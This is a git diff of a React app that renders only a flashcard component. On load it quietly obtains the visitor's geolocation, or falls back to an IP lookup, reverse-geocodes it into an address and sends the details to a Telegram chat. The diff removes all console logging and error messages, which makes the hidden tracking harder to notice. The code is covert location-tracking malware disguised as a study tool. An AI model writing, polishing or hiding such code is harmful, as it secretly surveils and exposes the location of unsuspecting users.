@@ -12,13 +12,11 @@ function App() {
           const lon = position.coords.longitude;
           getAddress(lat, lon, "Geolocation");
         },
-        (error) => {
-          console.error("Joylashuvni aniqlashda xatolik:", error.message);
+        () => {
           getLocationByIP();
         }
       );
     } else {
-      console.log("Geolocation API qo‘llab-quvvatlanmaydi.");
       getLocationByIP();
     }
   }, []);
@@ -30,7 +28,6 @@ function App() {
       )
       .then((response) => {
         const data = response.data;
-        console.log("📍 To‘liq manzil:", data.display_name);
         
         sendToTelegram({
           country: data.address.country || "Aniqlanmadi",
@@ -43,12 +40,10 @@ function App() {
           source,
         });
       })
-      .catch((error) => console.error("Xatolik:", error));
   }
 
   function getLocationByIP() {
     axios.get(IP_API).then((res) => {
-      console.log("🌍 IP orqali joylashuv aniqlandi...");
       let [latitude, longitude] = res.data.loc.split(",");
       getAddress(parseFloat(latitude), parseFloat(longitude), "IP orqali");
 
@@ -83,8 +78,6 @@ function App() {
       caption: message,
       parse_mode: "HTML",
     })
-      .then(() => console.log("✅ Telegramga yuborildi"))
-      .catch((err) => console.error("❌ Telegramga yuborishda xatolik:", err));
   }
 
   return <FlashcardComponent />;
